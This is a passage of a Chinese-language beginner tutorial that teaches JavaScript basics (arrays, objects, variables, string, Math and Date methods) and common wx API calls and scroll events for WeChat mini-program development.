class="string">&quot;霸王别姬&quot;</span>,<span class="string">&quot;这个杀手不太冷&quot;</span>,<span class="string">&quot;阿甘正传&quot;</span>,<span class="string">&quot;美丽人生&quot;</span>])</span><br></pre></td></tr></table></figure><p>可以通过索引值打印数组里的单一数据，也就是通过指定数组名以及索引值，来访问某个特定的元素：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([<span class="string">&quot;肖申克的救赎&quot;</span>,<span class="string">&quot;霸王别姬&quot;</span>,<span class="string">&quot;这个杀手不太冷&quot;</span>,<span class="string">&quot;阿甘正传&quot;</span>,<span class="string">&quot;美丽人生&quot;</span>][<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h3 id="0x002-console-log打印对象Object"><a href="#0x002-console-log打印对象Object" class="headerlink" title="0x002 console.log打印对象Object"></a>0x002 console.log打印对象Object</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;<span class="attr">name</span>: <span class="string">&quot;霸王别姬&quot;</span>,<span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p1910813120.webp&quot;</span>,<span class="attr">desc</span>: <span class="string">&quot;风华绝代。&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问该属性对应的值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;<span class="attr">name</span>: <span class="string">&quot;霸王别姬&quot;</span>,<span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p1910813120.webp&quot;</span>,<span class="attr">desc</span>: <span class="string">&quot;风华绝代。&quot;</span>&#125;.<span class="property">desc</span>)</span><br></pre></td></tr></table></figure><h2 id="0x02-变量与赋值"><a href="#0x02-变量与赋值" class="headerlink" title="0x02 变量与赋值"></a>0x02 变量与赋值</h2><p>JavaScript可以使用<strong>let语句声明变量</strong>，使用<strong>等号&#x3D;<strong>可以</strong>给变量赋值</strong>，等号&#x3D;左侧为<strong>变量名</strong>，右侧为<strong>给该变量赋的值</strong>，变量的值可以是任何<strong>数据类型</strong></p><p>JavaScript常见的数据类型有：数值（Number）、字符串（String）、布尔值（Boolean）、对象（Object）、函数（Function）等。</p><h3 id="0x001-将数据赋值给变量"><a href="#0x001-将数据赋值给变量" class="headerlink" title="0x001 将数据赋值给变量"></a>0x001 将数据赋值给变量</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> movielist=[<span class="string">&quot;肖申克的救赎&quot;</span>,<span class="string">&quot;霸王别姬&quot;</span>,<span class="string">&quot;这个杀手不太冷&quot;</span>,<span class="string">&quot;阿甘正传&quot;</span>,<span class="string">&quot;美丽人生&quot;</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(movielist)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(movielist[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印情况</span></span><br><span class="line"><span class="keyword">let</span> movie=&#123;<span class="attr">name</span>: <span class="string">&quot;霸王别姬&quot;</span>,<span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p1910813120.webp&quot;</span>,<span class="attr">desc</span>: <span class="string">&quot;风华绝代。&quot;</span>&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(movie)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(movie.<span class="property">name</span>)</span><br></pre></td></tr></table></figure><p><strong>将复杂的数据信息（数组、对象）赋值给一个变量</strong>，代码得到了大大的简化，可以深刻了解到<strong>变量是用于存储信息的”容器”</strong></p><h3 id="0x002-变量的冲突与覆盖"><a href="#0x002-变量的冲突与覆盖" class="headerlink" title="0x002 变量的冲突与覆盖"></a>0x002 变量的冲突与覆盖</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> school  <span class="comment">//声明变量</span></span><br><span class="line">school=<span class="string">&quot;清华&quot;</span>   <span class="comment">//将字符串String&quot;清华&quot;赋值给变量</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(school)  <span class="comment">//打印变量</span></span><br><span class="line">school=[<span class="string">&quot;清华&quot;</span>,<span class="string">&quot;北大&quot;</span>,<span class="string">&quot;上交&quot;</span>,<span class="string">&quot;复旦&quot;</span>,<span class="string">&quot;浙大&quot;</span>,<span class="string">&quot;南大&quot;</span>,<span class="string">&quot;中科大&quot;</span>] <span class="comment">//给变量赋值新的数据类型新的数据</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(school)  <span class="comment">//打印变量</span></span><br></pre></td></tr></table></figure><h2 id="0x03-操作数组"><a href="#0x03-操作数组" class="headerlink" title="0x03 操作数组"></a>0x03 操作数组</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movielist=[<span class="string">&quot;肖申克的救赎&quot;</span>,<span class="string">&quot;霸王别姬&quot;</span>,<span class="string">&quot;这个杀手不太冷&quot;</span>,<span class="string">&quot;阿甘正传&quot;</span>,<span class="string">&quot;美丽人生&quot;</span>]<span class="comment">//赋值一个数组</span></span><br></pre></td></tr></table></figure><h3 id="0x001-分隔符join方法"><a href="#0x001-分隔符join方法" class="headerlink" title="0x001 分隔符join方法"></a>0x001 分隔符join方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//join方法将数组元素拼接为字符串,以分隔符分割，默认是逗号,分割。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(movielist.<span class="title function_">join</span>(<span class="string">&quot;、&quot;</span>))</span><br></pre></td></tr></table></figure><h3 id="0x002-添加数组push方法"><a href="#0x002-添加数组push方法" class="headerlink" title="0x002 添加数组push方法"></a>0x002 添加数组push方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//push()方法向数组的末尾添加一个或更多元素，并返回新数组的长度。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(movielist.<span class="title function_">push</span>(<span class="string">&quot;千与千寻&quot;</span>,<span class="string">&quot;泰坦尼克号&quot;</span>,<span class="string">&quot;辛德勒的名单&quot;</span>,<span class="string">&quot;盗梦空间&quot;</span>,<span class="string">&quot;忠犬八公的故事&quot;</span>))</span><br></pre></td></tr></table></figure><h3 id="0x003-移除最后一项pop方法"><a href="#0x003-移除最后一项pop方法" class="headerlink" title="0x003 移除最后一项pop方法"></a>0x003 移除最后一项pop方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(movielist.<span class="title function_">pop</span>())</span><br></pre></td></tr></table></figure><h2 id="0x04-操作对象"><a href="#0x04-操作对象" class="headerlink" title="0x04 操作对象"></a>0x04 操作对象</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movie=&#123;<span class="attr">name</span>: <span class="string">&quot;霸王别姬&quot;</span>,<span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p1910813120.webp&quot;</span>,<span class="attr">desc</span>: <span class="string">&quot;风华绝代。&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="0x001-给对象添加属性"><a href="#0x001-给对象添加属性" class="headerlink" title="0x001 给对象添加属性"></a>0x001 给对象添加属性</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movie.<span class="property">englishname</span>=<span class="string">&quot;Farewell My Concubine&quot;</span></span><br></pre></td></tr></table></figure><h3 id="0x002-删除对象的某个属性"><a href="#0x002-删除对象的某个属性" class="headerlink" title="0x002 删除对象的某个属性"></a>0x002 删除对象的某个属性</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> movie.<span class="property">img</span></span><br></pre></td></tr></table></figure><h3 id="0x003-更新对象的某个属性"><a href="#0x003-更新对象的某个属性" class="headerlink" title="0x003 更新对象的某个属性"></a>0x003 更新对象的某个属性</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movie.<span class="property">desc</span>=<span class="string">&quot;人生如戏。&quot;</span></span><br></pre></td></tr></table></figure><h2 id="0x05-常量"><a href="#0x05-常量" class="headerlink" title="0x05 常量"></a>0x05 常量</h2><p>变量的值可以通过重新赋值的方式来改变，但是有些数据我们希望是固定的（写死，不会经常改变），这个时候可以使用<strong>const声明</strong>创建一个值的<strong>只读</strong>引用。</p><p>开发小程序的时候，我们会确定小程序的色系、颜色等，使用const声明，以后直接调用这个常量，这样就不用记那么多复杂的参数，以后想全网改样式，直接改const的内容即可。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> defaultStyle = &#123;</span><br><span class="line">  <span class="attr">color</span>: <span class="string">&#x27;#7A7E83&#x27;</span>,</span><br><span class="line">  <span class="attr">selectedColor</span>: <span class="string">&#x27;#3cc51f&#x27;</span>,</span><br><span class="line">  <span class="attr">backgroundColor</span>: <span class="string">&#x27;#ffffff&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-字符串的操作"><a href="#0x06-字符串的操作" class="headerlink" title="0x06 字符串的操作"></a>0x06 字符串的操作</h2><table><thead><tr><th>length</th><th>返回字符串的长度</th></tr></thead><tbody><tr><td>charAt(4)</td><td>返回在指定位置的字符</td></tr><tr><td>substring(3,6)</td><td>从索引3开始到6（不包括6）</td></tr><tr><td>substring(4)</td><td>从索引4开始到结束</td></tr><tr><td>toLowerCase()</td><td>把一个字符串全部变为小写</td></tr><tr><td>toUpperCase()</td><td>把一个字符串全部变为大写</td></tr><tr><td>indexOf(‘oud’)</td><td>搜索指定字符串出现的位置</td></tr><tr><td>concat(lesson)</td><td>连接两个字符串</td></tr><tr><td>slice(4)</td><td>提取字符串的某个部分，并以新的字符串返回被提取的部分</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> lesson=<span class="string">&quot;云开发技术训练营&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> enname=<span class="string">&quot;CloudBase Camp&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lesson.<span class="property">length</span>);  <span class="comment">//返回字符串的长度</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lesson[<span class="number">4</span>]);  <span class="comment">//返回在指定位置的字符</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lesson.<span class="title function_">charAt</span>(<span class="number">4</span>));   <span class="comment">//返回在指定位置的字符</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lesson.<span class="title function_">substring</span>(<span class="number">3</span>,<span class="number">6</span>));  <span class="comment">//从索引3开始到6（不包括6）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lesson.<span class="title function_">substring</span>(<span class="number">4</span>));  <span class="comment">//从索引4开始到结束</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(enname.<span class="title function_">toLowerCase</span>()); <span class="comment">//把一个字符串全部变为小写：</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(enname.<span class="title function_">toUpperCase</span>());  <span class="comment">//把一个字符串全部变为大写：</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(enname.<span class="title function_">indexOf</span>(<span class="string">&#x27;oud&#x27;</span>)); <span class="comment">//搜索指定字符串出现的位置：</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(enname.<span class="title function_">concat</span>(lesson)); <span class="comment">//连接两个字符串</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lesson.<span class="title function_">slice</span>(<span class="number">4</span>)); <span class="comment">//提取字符串的某个部分，并以新的字符串返回被提取的部分</span></span><br></pre></td></tr></table></figure><h2 id="0x07-Math对象"><a href="#0x07-Math对象" class="headerlink" title="0x07 Math对象"></a>0x07 Math对象</h2><table><thead><tr><th>Math.abs(b)</th><th>返回b的绝对值</th></tr></thead><tbody><tr><td>Math.round(z)</td><td>返回b的绝对值</td></tr><tr><td>Math.pow(x,y)</td><td>返回x的y次幂</td></tr><tr><td>Math.max(x,y,z,a,b,c)</td><td>返回x,y,z,a,b,c的最大值</td></tr><tr><td>Math.min(x,y,z,a,b,c)</td><td>返回x,y,z,a,b,c的最小值</td></tr><tr><td>Math.sign(a)</td><td>返回a是正数还是负数</td></tr><tr><td>Math.hypot(x,y)</td><td>返回所有x,y的平方和的平方根</td></tr><tr><td>Math.PI</td><td>返回一个圆的周长与直径的比例，约3.1415</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x=<span class="number">3</span>,y=<span class="number">4</span>,z=<span class="number">5.001</span>,a=-<span class="number">3</span>,b=-<span class="number">4</span>,c=-<span class="number">5</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">abs</span>(b)); <span class="comment">//返回b的绝对值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">round</span>(z));<span class="comment">//返回z四舍五入后的整数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">pow</span>(x,y)) <span class="comment">//返回x的y次幂</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">max</span>(x,y,z,a,b,c)); <span class="comment">//返回x,y,z,a,b,c的最大值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">min</span>(x,y,z,a,b,c));<span class="comment">//返回x,y,z,a,b,c的最小值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">sign</span>(a));  <span class="comment">//返回a是正数还是负数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="title function_">hypot</span>(x,y));  <span class="comment">//返回所有x,y的平方和的平方根 </span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="property">PI</span>);  <span class="comment">//返回一个圆的周长与直径的比例，约3.1415</span></span><br></pre></td></tr></table></figure><h2 id="0x08-Date对象"><a href="#0x08-Date对象" class="headerlink" title="0x08 Date对象"></a>0x08 Date对象</h2><p>Date 对象用于处理日期和时间。时间有年、月、日、星期、小时、分钟、秒、毫秒以及时区的概念</p><table><thead><tr><th>getFullYear()</th><th><em>从 Date 对象以四位数字返回年份。</em></th></tr></thead><tbody><tr><td>getMonth()</td><td><em>从 Date 对象返回月份 (0 ~ 11)。</em></td></tr><tr><td>getDate()</td><td><em>从 Date 对象返回一个月中的某一天 (1 ~ 31)。</em></td></tr><tr><td>getDay()</td><td><em>从 Date 对象返回一周中的某一天 (0 ~ 6)。</em></td></tr><tr><td>getHours()</td><td><em>返回 Date 对象的小时 (0 ~ 23)。</em></td></tr><tr><td>getMinutes()</td><td><em>返回 Date 对象的分钟 (0 ~ 59)。</em></td></tr><tr><td>getSeconds()</td><td><em>返回 Date 对象的秒数 (0 ~ 59)。</em></td></tr><tr><td>getMilliseconds()</td><td><em>返回 Date 对象的毫秒(0 ~ 999)。</em></td></tr><tr><td>getTime()</td><td><em>返回 1970 年 1 月 1 日至今的毫秒数。</em></td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();  <span class="comment">//返回当日的日期和时间。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getFullYear</span>()); <span class="comment">//从 Date 对象以四位数字返回年份。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getMonth</span>());  <span class="comment">//从 Date 对象返回月份 (0 ~ 11)。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getDate</span>());  <span class="comment">//从 Date 对象返回一个月中的某一天 (1 ~ 31)。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getDay</span>());  <span class="comment">//从 Date 对象返回一周中的某一天 (0 ~ 6)。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getHours</span>());  <span class="comment">//返回 Date 对象的小时 (0 ~ 23)。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getMinutes</span>());  <span class="comment">//返回 Date 对象的分钟 (0 ~ 59)。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getSeconds</span>());  <span class="comment">//返回 Date 对象的秒数 (0 ~ 59)。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getMilliseconds</span>());  <span class="comment">//返回 Date 对象的毫秒(0 ~ 999)。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(now.<span class="title function_">getTime</span>());  <span class="comment">//返回 1970 年 1 月 1 日至今的毫秒数。</span></span><br></pre></td></tr></table></figure><h2 id="0x09-全局对象wx"><a href="#0x09-全局对象wx" class="headerlink" title="0x09 全局对象wx"></a>0x09 全局对象wx</h2><p>wx是小程序的全局对象，用于承载小程序能力相关 <a href="https://developers.weixin.qq.com/miniprogram/dev/api/">API</a>。</p><h3 id="0x001-了解网络状态"><a href="#0x001-了解网络状态" class="headerlink" title="0x001 了解网络状态"></a>0x001 了解网络状态</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wx.<span class="title function_">getNetworkType</span>(&#123;</span><br><span class="line">  <span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="0x002-了解用户信息"><a href="#0x002-了解用户信息" class="headerlink" title="0x002 了解用户信息"></a>0x002 了解用户信息</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wx.<span class="title function_">getUserInfo</span>(&#123;</span><br><span class="line">  <span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="0x003-获取设备信息"><a href="#0x003-获取设备信息" class="headerlink" title="0x003 获取设备信息"></a>0x003 获取设备信息</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wx.<span class="title function_">getSystemInfo</span>(&#123;</span><br><span class="line">  success (res) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">model</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">pixelRatio</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">windowWidth</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">windowHeight</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">language</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">version</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">platform</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="0x004-页面链接跳转"><a href="#0x004-页面链接跳转" class="headerlink" title="0x004 页面链接跳转"></a>0x004 页面链接跳转</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wx.<span class="title function_">navigateTo</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;/pages/home/imgshow/imgshow&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="0x005-返回页面的上一层"><a href="#0x005-返回页面的上一层" class="headerlink" title="0x005 返回页面的上一层"></a>0x005 返回页面的上一层</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wx.<span class="title function_">navigateBack</span>(&#123;</span><br><span class="line">  <span class="attr">delta</span>: <span class="number">1</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="0x006-显示消息提示框"><a href="#0x006-显示消息提示框" class="headerlink" title="0x006 显示消息提示框"></a>0x006 显示消息提示框</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wx.<span class="title function_">showToast</span>(&#123;</span><br><span class="line">  <span class="attr">title</span>: <span class="string">&#x27;弹出成功&#x27;</span>,</span><br><span class="line">  <span class="attr">icon</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">  <span class="attr">duration</span>: <span class="number">1000</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="0x007-设置当前页面的标题"><a href="#0x007-设置当前页面的标题" class="headerlink" title="0x007 设置当前页面的标题"></a>0x007 设置当前页面的标题</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wx.<span class="title function_">setNavigationBarTitle</span>(&#123;</span><br><span class="line">  <span class="attr">title</span>: <span class="string">&#x27;控制台更新的标题&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="0x008-打开文件选择"><a href="#0x008-打开文件选择" class="headerlink" title="0x008 打开文件选择"></a>0x008 打开文件选择</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wx.<span class="title function_">chooseImage</span>(&#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">sizeType</span>: [<span class="string">&#x27;original&#x27;</span>, <span class="string">&#x27;compressed&#x27;</span>],</span><br><span class="line">  <span class="attr">sourceType</span>: [<span class="string">&#x27;album&#x27;</span>, <span class="string">&#x27;camera&#x27;</span>],</span><br><span class="line">  success (res) &#123;</span><br><span class="line">    <span class="keyword">const</span> tempFilePaths = res.<span class="property">tempFilePaths</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="0x10-点击事件"><a href="#0x10-点击事件" class="headerlink" title="0x10 点击事件"></a>0x10 点击事件</h2><p><strong>事件</strong>是视图层到逻辑层的通信方式，当我们<strong>点击tap</strong>、<strong>触摸touch</strong>、<strong>长按longpress</strong>小程序<strong>绑定了事件的组件</strong>时，就会触发事件，执行逻辑层中对应的<strong>事件处理函数</strong>。</p><p>点击事件就用到bindtap,它的赋值为一个函数名，且函数的命名规则为小写＋大写驼峰式，如类似于scrollToTop。</p><h2 id="0x11-页面滚动-返回顶部"><a href="#0x11-页面滚动-返回顶部" class="headerlink" title="0x11 页面滚动(返回顶部)"></a>0x11 页面滚动(返回顶部)</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">bindtap</span>=<span class="string">&quot;scrollToPosition&quot;</span>&gt;</span>滚动到页面指定位置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;pagetop&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#333;width:100%;height:400px&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">bindtap</span>=<span class="string">&quot;scrollToTop&quot;</span>&gt;</span>滚动到页面顶部（返回顶部）<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">id</span>=<span class="string">&quot;pageblock&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#333;width:100%;height:400px&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这里的 type&#x3D;”primary”只是引入weui给button添加的样式。而函数名scrollToPosition和scrollToTop是可以自己定义的，然后我们再来在相应的js文件里要添加和函数名scrollToPosition和scrollToTop对应的事件处理函数。</p></blockquote><p>在js的Page({})里（也就是和 data:{}、 onLoad: function (options) { }等函数平级），输入以下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">scrollToTop</span>(<span class="params"></span>) &#123;</span><br><span class="line">  wx.<span class="title function_">pageScrollTo</span>(&#123;</span><br><span class="line">    <span class="attr">scrollTop</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">duration</span>: <span class="number">300</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"> </span><br><span class="line"><span class="title function_">scrollToPosition</span>(<span class="params"></span>) &#123;</span><br><span class="line">  wx.<span class="title function_">pageScrollTo</span>(&#123;</span><br><span class="line">    <span class="attr">scrollTop</span>: <span class="number">6000</span>,</span><br><span class="line">    <span class="attr">duration</span>: <span class="number">300</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><blockquote><p>原理是scrollToTop()和scrollToPosition()这两个函数实际上都是调用了同一个小程序的<strong>滚动API</strong> wx.pageScrollTo()</p></blockquote><p>wx.pageScrollTo()的作用是将页面滚动到目标位置，支持选择器和滚动距离两种方式定位</p><ul><li>scrollTop滚动到页面的目标位置，单位 px，值为0就是滚动到顶部；值为600就是</li><li>duration是滚动动画的时长，单位为ms，而1秒&#x3D;1000毫秒</li></ul><h2 id="0x12-滚动到指定的选择器的位置"><a href="#0x12-滚动到指定的选择器的位置" class="headerlink" title="0x12 